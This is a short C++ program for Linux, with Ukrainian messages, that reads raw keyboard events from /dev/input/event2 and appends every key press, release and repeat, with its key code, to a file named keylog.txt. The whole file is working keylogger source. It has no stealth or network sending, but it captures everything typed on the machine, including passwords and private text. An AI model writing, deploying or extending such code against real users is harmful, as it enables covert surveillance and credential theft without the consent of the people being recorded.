#include <iostream>
#include <fstream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <cstring>
#include <array>

using namespace std;

int main() {
    const char* dev = "/dev/input/event2";

    int fd = open(dev, O_RDONLY);
    if (fd == -1) {
        cerr << "Помилка відкриття файлу пристрою!" << endl;
        return EXIT_FAILURE;
    }

    ofstream outputFile("keylog.txt", ios::app);
    if (!outputFile.is_open()) {
        cerr << "Помилка відкриття файлу для запису!" << endl;
        return EXIT_FAILURE;
    }

    array<string, 3> evval = {"RELEASED", "PRESSED", "REPEATED"};

    while (true) {
        struct input_event ev;
        ssize_t n = read(fd, &ev, sizeof(ev));
        if (n == -1) {
            if (errno == EINTR) {
                continue; // Читання перервано сигналом, продовжуємо
            }
            cerr << "Помилка читання події!" << endl;
            break;
        } else if (n != sizeof(ev)) {
            cerr << "Неправильний розмір події!" << endl;
            break;
        }

        if (ev.type == EV_KEY) {
            outputFile << "Клавіша: " << evval[ev.value] << " (код " << ev.code << ")" << std::endl;
        }
    }

    close(fd);
    outputFile.close();
    return 0;
}